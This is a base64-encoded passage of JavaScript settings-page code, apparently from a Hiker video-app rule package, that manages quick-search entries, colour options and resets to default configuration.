Q29uZmlnKCdxdWlja1NlYXJjaENvbmZpZ3MnLCBjb25maWcpO1xcbiAgICBkLnB1c2goe1xcbiAgICAgICAgdGl0bGU6ICfoh6rlrprkuYnlv6vpgJ/mkJzntKInLmJvbGQoKSxcXG4gICAgICAgIGNvbF90eXBlOiBcXFwicmljaF90ZXh0XFxcIlxcbiAgICB9KVxcbiAgICBmb3IgKGxldCBjb25maWdLZXkgb2YgcXVpY2tTZWFyY2hDb25maWdzLm9yZGVyKSB7XFxuICAgICAgICBkLnB1c2goe1xcbiAgICAgICAgICAgIHRpdGxlOiBjb25maWdLZXksXFxuICAgICAgICAgICAgdXJsOiAkKCfinpXmmK/mt7vliqBcXFxcbuKeluaYr+WIoOmZpFxcXFxu8J+TneaYr+S/ruaUuVxcXFxu8J+UgeaYr+aOkuW6j1xcXFxu4pqZ77iP5piv6K6+572u5qC35byPJykuY29uZmlybSgoKSA9PiB7XFxuICAgICAgICAgICAgICAgIHJldHVybiAndG9hc3Q6Ly/kuIvmrKHkuI3opoHlho3ngrnmiJHkuoYnXFxuICAgICAgICAgICAgfSksXFxuICAgICAgICAgICAgY29sX3R5cGU6ICdmbGV4X2J1dHRvbidcXG4gICAgICAgIH0pXFxuICAgIH1cXG4gICAgZC5wdXNoKHtcXG4gICAgICAgIGNvbF90eXBlOiAnYmxhbmtfYmxvY2snXFxuICAgIH0pXFxuICAgIGQucHVzaCh7XFxuICAgICAgICB0aXRsZTogJ+Kele+4jycsXFxuICAgICAgICBjb2xfdHlwZTogJ2ZsZXhfYnV0dG9uJyxcXG4gICAgICAgIHVybDogJCgn5pi+56S65ZCNQEDlsI/nqIvluo/lkI1AQOWbvueJh+mTvuaOpScsICfmoLnmja7mj5DnpLrovpPlhaXlsLHlpb3kuoZcXFxcbuWwj+eoi+W6j+WQjeS4uuepuuWImeS4uua1t+mYlOaQnOe0oicpLmlucHV0KCgpID0+IHtcXG4gICAgICAgICAgICBsZXQgY29uZmlnID0gSlNPTi5wYXJzZShmZXRjaChnZXRNeVZhcigncWRiX2NvbmZpZycpKSk7XFxuICAgICAgICAgICAgaW5wdXQgPSBpbnB1dC5zcGxpdCgnQEAnKTtcXG4gICAgICAgICAgICBpZihpbnB1dC5sZW5ndGggIT0gMyB8fCBpbnB1dFswXSA9PT0gXFxcIlxcXCIpIHJldHVybiBcXFwidG9hc3Q6Ly/moLzlvI/kuI3lr7nvvIzmjInmoLzlvI/ovpPlhaUhXFxcIjtcXG4gICAgICAgICAgICBpZiAoY29uZmlnLnF1aWNrU2VhcmNoQ29uZmlncy5vcmRlci5pbmRleE9mKGlucHV0WzBdKSA9PSAtMSkgY29uZmlnLnF1aWNrU2VhcmNoQ29uZmlncy5vcmRlci5wdXNoKGlucHV0WzBdKTtcXG4gICAgICAgICAgICBjb25maWcucXVpY2tTZWFyY2hDb25maWdzW2lucHV0WzBdXSA9IHtcXG4gICAgICAgICAgICAgICAgbmFtZTogaW5wdXRbMV0sXFxuICAgICAgICAgICAgICAgIHBpYzogaW5wdXRbMl1cXG4gICAgICAgICAgICB9O1xcbiAgICAgICAgICAgIHdyaXRlRmlsZShnZXRNeVZhcigncWRiX2NvbmZpZycpLCBKU09OLnN0cmluZ2lmeShjb25maWcpKTtcXG4gICAgICAgICAgICByZWZyZXNoUGFnZShmYWxzZSk7XFxuICAgICAgICAgICAgcmV0dXJuICd0b2FzdDovL+a3u+WKoOaIkOWKnyc7XFxuICAgICAgICB9KVxcbiAgICB9KTtcXG4gICAgZC5wdXNoKHtcXG4gICAgICAgIHRpdGxlOiAn4p6WJyxcXG4gICAgICAgIGNvbF90eXBlOiAnZmxleF9idXR0b24nLFxcbiAgICAgICAgdXJsOiAkKHF1aWNrU2VhcmNoQ29uZmlncy5vcmRlciwgMikuc2VsZWN0KCgpID0+IHtcXG4gICAgICAgICAgICBsZXQgY29uZmlnID0gSlNPTi5wYXJzZShyZXF1ZXN0KGdldE15VmFyKCdxZGJfY29uZmlnJykpKVxcbiAgICAgICAgICAgIHJldHVybiAkKCfnoa7orqTliKDpmaRcXFwiJyArIGlucHV0ICsgJ1xcXCLvvJ8nKS5jb25maXJtKChjb25maWcsIGNvbmZpZ0tleSkgPT4ge1xcbiAgICAgICAgICAgICAgICBsZXQgaW5kZXggPSBjb25maWcucXVpY2tTZWFyY2hDb25maWdzLm9yZGVyLmluZGV4T2YoY29uZmlnS2V5KTtcXG4gICAgICAgICAgICAgICAgY29uZmlnLnF1aWNrU2VhcmNoQ29uZmlncy5vcmRlci5zcGxpY2UoaW5kZXgsIDEpO1xcbiAgICAgICAgICAgICAgICBkZWxldGUgY29uZmlnLnF1aWNrU2VhcmNoQ29uZmlnc1tjb25maWdLZXldXFxuICAgICAgICAgICAgICAgIHdyaXRlRmlsZShnZXRNeVZhcigncWRiX2NvbmZpZycpLCBKU09OLnN0cmluZ2lmeShjb25maWcpKVxcbiAgICAgICAgICAgICAgICByZWZyZXNoUGFnZShmYWxzZSk7XFxuICAgICAgICAgICAgICAgIHJldHVybiAndG9hc3Q6Ly/liKDpmaQnICsgY29uZmlnS2V5ICsgJ+aIkOWKnydcXG4gICAgICAgICAgICB9LCBjb25maWcsIGlucHV0KVxcbiAgICAgICAgfSlcXG4gICAgfSlcXG4gICAgZC5wdXNoKHtcXG4gICAgICAgIHRpdGxlOiAn8J+TnScsXFxuICAgICAgICBjb2xfdHlwZTogJ2ZsZXhfYnV0dG9uJyxcXG4gICAgICAgIHVybDogJChxdWlja1NlYXJjaENvbmZpZ3Mub3JkZXIsIDIpLnNlbGVjdCgoKSA9PiB7XFxuICAgICAgICAgICAgbGV0IGNvbmZpZyA9IEpTT04ucGFyc2UocmVxdWVzdChnZXRNeVZhcigncWRiX2NvbmZpZycpKSk7XFxuICAgICAgICAgICAgbGV0IHF1aWNrU2VhcmNoQ29uZmlncyA9IGNvbmZpZy5xdWlja1NlYXJjaENvbmZpZ3M7XFxuICAgICAgICAgICAgbGV0IGR0ZXh0ID0gaW5wdXQgKyAnQEAnICsgcXVpY2tTZWFyY2hDb25maWdzW2lucHV0XS5uYW1lICsgJ0BAJyArIHF1aWNrU2VhcmNoQ29uZmlnc1tpbnB1dF0ucGljO1xcbiAgICAgICAgICAgIHJldHVybiAkKGR0ZXh0LCAn6K+35L+u5pS5JykuaW5wdXQoKGNvbmZpZywgcmF3KSA9PiB7XFxuICAgICAgICAgICAgICAgIGlucHV0ID0gaW5wdXQuc3BsaXQoJ0BAJyk7XFxuICAgICAgICAgICAgICAgIGlmIChyYXcgIT0gaW5wdXRbMF0pIHtcXG4gICAgICAgICAgICAgICAgICAgIGxldCBpbmRleCA9IGNvbmZpZy5xdWlja1NlYXJjaENvbmZpZ3Mub3JkZXIuaW5kZXhPZihyYXcpO1xcbiAgICAgICAgICAgICAgICAgICAgY29uZmlnLnF1aWNrU2VhcmNoQ29uZmlncy5vcmRlcltpbmRleF0gPSBpbnB1dFswXTtcXG4gICAgICAgICAgICAgICAgICAgIGRlbGV0ZSBjb25maWcucXVpY2tTZWFyY2hDb25maWdzW3Jhd107XFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgaWYgKGNvbmZpZy5xdWlja1NlYXJjaENvbmZpZ3Mub3JkZXIuaW5kZXhPZihpbnB1dFswXSkgPT0gLTEpIGNvbmZpZy5xdWlja1NlYXJjaENvbmZpZ3Mub3JkZXIucHVzaChpbnB1dFswXSk7XFxuICAgICAgICAgICAgICAgIGNvbmZpZy5xdWlja1NlYXJjaENvbmZpZ3NbaW5wdXRbMF1dID0ge1xcbiAgICAgICAgICAgICAgICAgICAgbmFtZTogaW5wdXRbMV0sXFxuICAgICAgICAgICAgICAgICAgICBwaWM6IGlucHV0WzJdXFxuICAgICAgICAgICAgICAgIH07XFxuICAgICAgICAgICAgICAgIHdyaXRlRmlsZShnZXRNeVZhcigncWRiX2NvbmZpZycpLCBKU09OLnN0cmluZ2lmeShjb25maWcpKTtcXG4gICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpO1xcbiAgICAgICAgICAgICAgICByZXR1cm4gJ3RvYXN0Oi8v5L+u5pS55oiQ5YqfJztcXG4gICAgICAgICAgICB9LCBjb25maWcsIGlucHV0KVxcbiAgICAgICAgfSlcXG4gICAgfSlcXG4gICAgZC5wdXNoKHtcXG4gICAgICAgIHRpdGxlOiAn8J+UgScsXFxuICAgICAgICBjb2xfdHlwZTogJ2ZsZXhfYnV0dG9uJyxcXG4gICAgICAgIHVybDogJCgnaGlrZXI6Ly9lbXB0eSNub0hpc3RvcnkjJykucnVsZSgoKSA9PiB7XFxuICAgICAgICAgICAgYWRkTGlzdGVuZXIoJ29uQ2xvc2UnLCAkLnRvU3RyaW5nKCgpID0+IHtcXG4gICAgICAgICAgICAgICAgY2xlYXJNeVZhcignanNvbicpO1xcbiAgICAgICAgICAgICAgICBjbGVhck15VmFyKCdvcCcpO1xcbiAgICAgICAgICAgIH0pKVxcbiAgICAgICAgICAgIGlmIChnZXRNeVZhcignanNvbicpID09IFxcXCJcXFwiKSB7XFxuICAgICAgICAgICAgICAgIGxldCBjb25maWcgPSBKU09OLnBhcnNlKHJlcXVlc3QoZ2V0TXlWYXIoJ3FkYl9jb25maWcnKSkpO1xcbiAgICAgICAgICAgICAgICBsZXQgcXVpY2tTZWFyY2hDb25maWdzID0gY29uZmlnLnF1aWNrU2VhcmNoQ29uZmlncztcXG4gICAgICAgICAgICAgICAgcHV0TXlWYXIoJ2pzb24nLCBKU09OLnN0cmluZ2lmeShxdWlja1NlYXJjaENvbmZpZ3MpKTtcXG4gICAgICAgICAgICB9XFxuXFxuICAgICAgICAgICAgbGV0IG9sZCA9IEpTT04ucGFyc2UoZ2V0TXlWYXIoJ2pzb24nKSk7XFxuICAgICAgICAgICAgbGV0IGQgPSBbXTtcXG4gICAgICAgICAgICBkLnB1c2goe1xcbiAgICAgICAgICAgICAgICB0aXRsZTogJ+WIhuWIq+eCueWHu+S4pOmhueS7peS6pOaNoumhuuW6j1xcXFxu4oCY4oCY5o6S5bqP5a6M5q+V5ZCO54K55oiR5L+d5a2Y5o6S5bqPLOWQpuWImeaOkuW6j+S4jeeUn+aViOKAmeKAmScsXFxuICAgICAgICAgICAgICAgIGNvbF90eXBlOiAndGV4dF9jZW50ZXJfMScsXFxuICAgICAgICAgICAgICAgIHVybDogJCgnI25vTG9hZGluZyMnKS5sYXp5UnVsZSgoKSA9PiB7XFxuICAgICAgICAgICAgICAgICAgICBsZXQgY29uZmlnID0gSlNPTi5wYXJzZShmZXRjaChnZXRNeVZhcigncWRiX2NvbmZpZycpKSk7XFxuICAgICAgICAgICAgICAgICAgICBjb25maWcucXVpY2tTZWFyY2hDb25maWdzID0gSlNPTi5wYXJzZShnZXRNeVZhcignanNvbicpKTtcXG4gICAgICAgICAgICAgICAgICAgIHdyaXRlRmlsZShnZXRNeVZhcigncWRiX2NvbmZpZycpLCBKU09OLnN0cmluZ2lmeShjb25maWcpKTtcXG4gICAgICAgICAgICAgICAgICAgIGJhY2sodHJ1ZSk7XFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gJ3RvYXN0Oi8v5L+u5pS55oiQ5YqfJ1xcbiAgICAgICAgICAgICAgICB9KVxcbiAgICAgICAgICAgIH0pXFxuICAgICAgICAgICAgb2xkLm9yZGVyLmZvckVhY2goKHZhbHVlLCBpbmRleCkgPT4ge1xcbiAgICAgICAgICAgICAgICBkLnB1c2goe1xcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IGdldE15VmFyKCdvcCcpID09IHZhbHVlID8gdmFsdWUgKyAn4oCY4oCYKOW9k+WJjemAieS4rSnigJnigJknIDogdmFsdWUsXFxuICAgICAgICAgICAgICAgICAgICBjb2xfdHlwZTogJ3RleHRfMScsXFxuICAgICAgICAgICAgICAgICAgICB1cmw6ICQoKS5sYXp5UnVsZSgoa2V5LCBpbmRleCkgPT4ge1xcbiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBvcCA9IGdldE15VmFyKCdvcCcpO1xcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChvcCA9PSAnJykge1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwdXRNeVZhcignb3AnLCBrZXkpO1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxuICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmIChvcCA9PSBrZXkpIHtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgY2xlYXJNeVZhcignb3AnKTtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuICdoaWtlcjovL2VtcHR5J1xcbiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBvbGQgPSBKU09OLnBhcnNlKGdldE15VmFyKCdqc29uJykpO1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgbmV3YSA9IHtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG1vZGU6IG9sZC5tb2RlLFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb3JkZXI6IG9sZC5vcmRlclxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9O1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgb3BpbmRleCA9IG5ld2Eub3JkZXIuaW5kZXhPZihvcCk7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChNYXRoLmFicyhvcGluZGV4IC0gaW5kZXgpID09IDEpIHtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5ld2Eub3JkZXJbb3BpbmRleF0gPSBrZXk7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBuZXdhLm9yZGVyW2luZGV4XSA9IG9wO1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKG9waW5kZXggPiBpbmRleCkge1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbmV3YS5vcmRlci5zcGxpY2Uob3BpbmRleCwgMSk7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBuZXdhLm9yZGVyLnNwbGljZShpbmRleCwgMCwgb3ApO1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbmV3YS5vcmRlci5zcGxpY2Uob3BpbmRleCwgMSk7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBuZXdhLm9yZGVyLnNwbGljZShpbmRleCAtIDEsIDAsIG9wKTtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBuZXdhLm9yZGVyLmZvckVhY2godmFsdWUgPT4gbmV3YVt2YWx1ZV0gPSBvbGRbdmFsdWVdKVxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwdXRNeVZhcignanNvbicsIEpTT04uc3RyaW5naWZ5KG5ld2EpKTtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgY2xlYXJNeVZhcignb3AnKTtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuICdoaWtlcjovL2VtcHR5J1xcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgICAgIH0sIHZhbHVlLCBpbmRleClcXG4gICAgICAgICAgICAgICAgfSlcXG4gICAgICAgICAgICB9KVxcbiAgICAgICAgICAgIHNldFJlc3VsdChkKTtcXG4gICAgICAgIH0pXFxuICAgIH0pXFxuICAgIGQucHVzaCh7XFxuICAgICAgICB0aXRsZTogJ+Kame+4jycsXFxuICAgICAgICBjb2xfdHlwZTogJ2ZsZXhfYnV0dG9uJyxcXG4gICAgICAgIHVybDogJChxdWlja1NlYXJjaENvbmZpZ3NbJ21vZGUnXSB8fCBcXFwiXFxcIiwgJ+ivt+ato+ehrui+k+WFpee7hOS7tuagt+W8j1xcXFxu5bu66K6u5YC8OmZsZXhfYnV0dG9uIHNjcm9sbF9idXR0b24gaWNvbl9yb3VuZF9zbWFsbF80IGljb25fc21hbGxfNCcpLmlucHV0KCgpID0+IHtcXG4gICAgICAgICAgICBsZXQgY29uZmlnID0gSlNPTi5wYXJzZShyZXF1ZXN0KGdldE15VmFyKCdxZGJfY29uZmlnJykpKTtcXG4gICAgICAgICAgICBjb25maWcucXVpY2tTZWFyY2hDb25maWdzLm1vZGUgPSBpbnB1dDtcXG4gICAgICAgICAgICB3cml0ZUZpbGUoZ2V0TXlWYXIoJ3FkYl9jb25maWcnKSwgSlNPTi5zdHJpbmdpZnkoY29uZmlnKSk7XFxuICAgICAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpO1xcbiAgICAgICAgICAgIHJldHVybiAndG9hc3Q6Ly/moLflvI/kv67mlLnmiJDlip8nXFxuICAgICAgICB9KVxcbiAgICB9KVxcbn1cXG5cXG4vL+iuvue9rumhtemdolxcbmZ1bmN0aW9uIHNldHRpbmdQYWdlKCkge1xcbiAgICBsZXQgY29uZiA9IGdldENvbmZpZygpO1xcbiAgICBsZXQgZCA9IFtdO1xcblxcbiAgICBsZXQgc3RhckNvbG9yID0gY29uZi5zdGFyQ29sb3IgfHwgJyNmZmFjMmQnO1xcbiAgICBkLnB1c2goe1xcbiAgICAgICAgdGl0bGU6ICfigJzigJzigJ3igJ0nICsgJ+iHquWumuS5ieaYn+aYn+minOiJsicuYm9sZCgpLFxcbiAgICAgICAgZGVzYzogJ+KAnOKAnOKAneKAnTxmb250IGNvbG9yPScgKyBzdGFyQ29sb3IgKyAnPicgKyAn4piF4piF4piF4piF4piFPC9mb250PicsXFxuICAgICAgICBjb2xfdHlwZTogJ3RleHRfMScsXFxuICAgICAgICB1cmw6ICQoc3RhckNvbG9yLCAn5Yir5b+Y5LqGIycpLmlucHV0KCgpID0+IHtcXG4gICAgICAgICAgICBsZXQgY29uZmlnID0gSlNPTi5wYXJzZShmZXRjaChnZXRNeVZhcigncWRiX2NvbmZpZycpKSk7XFxuICAgICAgICAgICAgY29uZmlnLnN0YXJDb2xvciA9IGlucHV0O1xcbiAgICAgICAgICAgIHdyaXRlRmlsZShnZXRNeVZhcigncWRiX2NvbmZpZycpLCBKU09OLnN0cmluZ2lmeShjb25maWcpKTtcXG4gICAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcbiAgICAgICAgICAgIHJldHVybiBcXFwidG9hc3Q6Ly/orr7nva7mm7TmlLnlt7Lkv53lrZhcXFwiO1xcbiAgICAgICAgfSlcXG4gICAgfSlcXG4gICAgbGV0IGNob29zZUNvbG9yID0gY29uZi5jaG9vc2VDb2xvciB8fCAnI0ZBNzI5OCc7XFxuICAgIGQucHVzaCh7XFxuICAgICAgICB0aXRsZTogJ+KAnOKAnOKAneKAnScgKyAn6Ieq5a6a5LmJ6YCJ5Lit5qCH562+6aKc6ImyJy5ib2xkKCksXFxuICAgICAgICBkZXNjOiAn4oCc4oCc4oCd4oCdPGZvbnQgY29sb3I9JyArIGNob29zZUNvbG9yICsgJz4nICsgJ+aIkeaYr+mihOiniOaViOaenDwvZm9udD4nLFxcbiAgICAgICAgY29sX3R5cGU6ICd0ZXh0XzEnLFxcbiAgICAgICAgdXJsOiAkKGNob29zZUNvbG9yLCAn5Yir5b+Y5LqGIycpLmlucHV0KCgpID0+IHtcXG4gICAgICAgICAgICBsZXQgY29uZmlnID0gSlNPTi5wYXJzZShmZXRjaChnZXRNeVZhcigncWRiX2NvbmZpZycpKSk7XFxuICAgICAgICAgICAgY29uZmlnLmNob29zZUNvbG9yID0gaW5wdXQ7XFxuICAgICAgICAgICAgd3JpdGVGaWxlKGdldE15VmFyKCdxZGJfY29uZmlnJyksIEpTT04uc3RyaW5naWZ5KGNvbmZpZykpO1xcbiAgICAgICAgICAgIHJlZnJlc2hQYWdlKCk7XFxuICAgICAgICAgICAgcmV0dXJuIFxcXCJ0b2FzdDovL+iuvue9ruabtOaUueW3suS/neWtmFxcXCI7XFxuICAgICAgICB9KVxcbiAgICB9KVxcblxcbiAgICBob21lUGFnZVNldHRpbmdNb2R1bGUoZCk7XFxuICAgIGQucHVzaCh7XFxuICAgICAgICBjb2xfdHlwZTogJ2xpbmUnXFxuICAgIH0pXFxuXFxuICAgIHF1aWNrU2VhcmNoRElZTW9kdWxlKGQsIGNvbmYpO1xcbiAgICBkLnB1c2goe1xcbiAgICAgICAgY29sX3R5cGU6ICdsaW5lJ1xcbiAgICB9KVxcblxcbiAgICBkZXRhaWxWaWV3U2V0dGluZ01vZHVsZShkKTtcXG4gICAgZC5wdXNoKHtcXG4gICAgICAgIGNvbF90eXBlOiAnbGluZSdcXG4gICAgfSlcXG5cXG4gICAgaWYgKHRydWUvKmdldEl0ZW0oJ3Bhc3N3b3JkJykgPT0gJ3RydWUnKi8pIHtcXG4gICAgICAgIGFuYWx5c2lzU2V0dGluZ01vZHVsZShkKTtcXG4gICAgICAgIGQucHVzaCh7XFxuICAgICAgICAgICAgY29sX3R5cGU6ICdsaW5lJ1xcbiAgICAgICAgfSlcXG4gICAgfVxcblxcbiAgICBkLnB1c2goe1xcbiAgICAgICAgdGl0bGU6ICfigJzigJzigJ3igJ0nICsgJ+aBouWkjem7mOiupOiuvue9ricuYm9sZCgpLFxcbiAgICAgICAgZGVzYzogJ+mHjeeUnycsXFxuICAgICAgICBjb2xfdHlwZTogJ3RleHRfMScsXFxuICAgICAgICB1cmw6ICQoWyfph43nva7mmJ/mmJ/popzoibInLCAn6YeN572u6YCJ5Lit5qCH562+6aKc6ImyJywgJ+mHjee9ruW/q+mAn+aQnOe0oicsICfph43nva7pppbpobXkuLrpu5jorqQnLCAn6YeN572u6K+m5oOF6aG1JyAsICfmuIXpmaTlhajpg6jorr7nva4nXSwgMSkuc2VsZWN0KCgpID0+IHtcXG4gICAgICAgICAgICByZXR1cm4gJChcXFwi56Gu5a6a6KaBXFxcIiArIGlucHV0ICsgXFxcIu+8n1xcXCIpLmNvbmZpcm0oKHNlbCkgPT4ge1xcbiAgICAgICAgICAgICAgICBsZXQgaXRlbSA9ICcnO1xcbiAgICAgICAgICAgICAgICBzd2l0Y2ggKHNlbCkge1xcbiAgICAgICAgICAgICAgICAgICAgY2FzZSAn6YeN572u5pif5pif6aKc6ImyJzpcXG4gICAgICAgICAgICAgICAgICAgICAgICBpdGVtID0gJ3N0YXJDb2xvcic7XFxuICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7XFxuICAgICAgICAgICAgICAgICAgICBjYXNlICfph43nva7pgInkuK3moIfnrb7popzoibInOlxcbiAgICAgICAgICAgICAgICAgICAgICAgIGl0ZW0gPSAnY2hvb3NlQ29sb3InO1xcbiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrO1xcbiAgICAgICAgICAgICAgICAgICAgY2FzZSAn6YeN572u5b+r6YCf5pCc57SiJzpcXG4gICAgICAgICAgICAgICAgICAgICAgICBpdGVtID0gJ3F1aWNrU2VhcmNoQ29uZmlncyc7XFxuICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7XFxuICAgICAgICAgICAgICAgICAgICBjYXNlICfph43nva7pppbpobXkuLrpu5jorqQnOlxcbiAgICAgICAgICAgICAgICAgICAgICAgIGl0ZW0gPSAnaG9tZVBhZ2VDb25maWdzJztcXG4gICAgICAgICAgICAgICAgICAgICAgICBicmVhaztcXG4gICAgICAgICAgICAgICAgICAgIGNhc2UgJ+mHjee9ruivpuaDhemhtSc6XFxuICAgICAgICAgICAgICAgICAgICAgICAgaXRlbSA9ICdkZXRhaWxWaWV3Q29uZmlncyc7XFxuICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7XFxuICAgICAgICAgICAgICAgICAgICBjYXNlICfmuIXpmaTlhajpg6jorr7nva4nOlxcbiAgICAgICAgICAgICAgICAgICAgICAgIGl0ZW0gPSAnYWxsJztcXG4gICAgICAgICAgICAgICAgICAgICAgICBicmVhaztcXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICAvLyBldmFsKEpTT04ucGFyc2UocmVxdWVzdCgnaGlrZXI6Ly9wYWdlL3NldHRpbmdQYWdlJykpLnJ1bGUpO1xcbiAgICAgICAgICAgICAgICBsZXQgZGVmYXVsdENvbmZpZ3MgPSAkLnJlcXVpcmUoXFxcImhpa2VyOi8vcGFnZS9kZWZhdWx0Q29uZmlnc1xcXCIpO1xcbiAgICAgICAgICAgICAgICBpZiAoaXRlbSA9PSAnYWxsJykge1xcbiAgICAgICAgICAgICAgICAgICAgd3JpdGVGaWxlKGdldE15VmFyKCdxZGJfY29uZmlnJyksIEpTT04uc3RyaW5naWZ5KGRlZmF1bHRDb25maWdzKSk7XFxuICAgICAgICAgICAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFxcXCJ0b2FzdDovL+W3slxcXCIgKyBzZWw7XFxuICAgICAgICAgICAgICAgIH0gZWxzZSBpZihpdGVtID09IFxcXCJob21lUGFnZUNvbmZpZ3NcXFwiKXtcXG4gICAgICAgICAgICAgICAgICAgIGxldCBjb25maWcgPSBKU09OLnBhcnNlKGZldGNoKGdldE15VmFyKCdxZGJfY29uZmlnJykpKTtcXG4gICAgICAgICAgICAgICAgICAgIGNvbmZpZ1tpdGVtXVtcXFwi6buY6K6kXFxcIl0gPSBkZWZhdWx0Q29uZmlnc1tpdGVtXVtcXFwi6buY6K6kXFxcIl07XFxuICAgICAgICAgICAgICAgICAgICBjb25maWdbaXRlbV0udXNlID0gXFxcIum7mOiupFxcXCI7XFxuICAgICAgICAgICAgICAgICAgICB3cml0ZUZpbGUoZ2V0TXlWYXIoJ3FkYl9jb25maWcnKSwgSlNPTi5zdHJpbmdpZnkoY29uZmlnKSk7XFxuICAgICAgICAgICAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFxcXCJ0b2FzdDovL+W3slxcXCIgKyBzZWw7XFxuICAgICAgICAgICAgICAgIH1lbHNlIHtcXG4gICAgICAgICAgICAgICAgICAgIGxldCBjb25maWcgPSBKU09OLnBhcnNlKGZldGNoKGdldE15VmFyKCdxZGJfY29uZmlnJykpKTtcXG4gICAgICAgICAgICAgICAgICAgIGNvbmZpZ1tpdGVtXSA9IGRlZmF1bHRDb25maWdzW2l0ZW1dO1xcbiAgICAgICAgICAgICAgICAgICAgd3JpdGVGaWxlKGdldE15VmFyKCdxZGJfY29uZmlnJyksIEpTT04uc3RyaW5naWZ5KGNvbmZpZykpO1xcbiAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFwidG9hc3Q6Ly/lt7JcXFwiICsgc2VsO1xcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgfSwgaW5wdXQpXFxuICAgICAgICB9KVxcbiAgICB9KVxcbiAgICBzZXRSZXN1bHQoZCk7XFxufVxcblxcbmxldCB2aWV3ID0gZ2V0UGFyYW0oXFxcInZpZXdcXFwiLFxcXCJcXFwiKTtcXG5pZih2aWV3PT1cXFwiXFxcIil7XFxuICAgIHNldFBhZ2VUaXRsZShcXFwi6K6+572uXFxcIilcXG4gICAgc2V0dGluZ1BhZ2UoKTtcXG59ZWxzZSBpZih2aWV3PT1cXFwiYW5hbHlzaXNTZXR0aW5nTW9kdWxlXFxcIil7XFxuICAgIGxldCBkID0gW107XFxuICAgIHNldFBhZ2VUaXRsZShcXFwi6Kej5p6Q6K6+572uXFxcIilcXG4gICAgYW5hbHlzaXNTZXR0aW5nTW9kdWxlKGQpO1xcbiAgICBzZXRSZXN1bHQoZCk7XFxufVwifSx7XCJjb2xfdHlwZVwiOlwibW92aWVfM1wiLFwibmFtZVwiOlwi6buY6K6k6YWN572uXCIsXCJwYXRoXCI6XCJkZWZhdWx0Q29uZmlnc1wiLFwicnVsZVwiOlwianM6XFxyXFxubGV0IGRlZmF1bHRDb25maWdzID0ge1xcclxcbiAgICBzdGFyQ29sb3I6IFxcXCIjZmZhYzJkXFxcIixcXHJcXG4gICAgY2hvb3NlQ29sb3I6IFxcXCIjRkE3Mjk4XFxcIixcXHJcXG4gICAgcXVpY2tTZWFyY2hDb25maWdzOiB7XFxyXFxuICAgICAgICBtb2RlOiBcXFwic2Nyb2xsX2J1dHRvblxcXCIsXFxyXFxuICAgICAgICBvcmRlcjogW1xcXCLmtbfpmJTmkJzntKJcXFwiXSxcXHJcXG4gICAgICAgIFxcXCLmtbfpmJTmkJzntKJcXFwiOiB7XFxyXFxuICAgICAgICAgICAgbmFtZTogXFxcIlxcXCIsXFxyXFxuICAgICAgICAgICAgcGljOiBcXFwiXFxcIlxcclxcbiAgICAgICAgfVxcclxcbiAgICB9LFxcclxcbiAgICBkZXRhaWxzVmlld0NvbmZpZ3M6IHtcXHJcXG4gICAgICAgIHVzZTogXFxcIum7mOiupFxcXCIsXFxyXFxuICAgICAgICBcXFwi6buY6K6kXFxcIjoge1xcclxcbiAgICAgICAgICAgIGNvbmZpZzogXFxcImV2YWwoSlNPTi5wYXJzZShyZXF1ZXN0KCdoaWtlcjovL3BhZ2UvbWFpbicpKS5ydWxlKTtkZXRh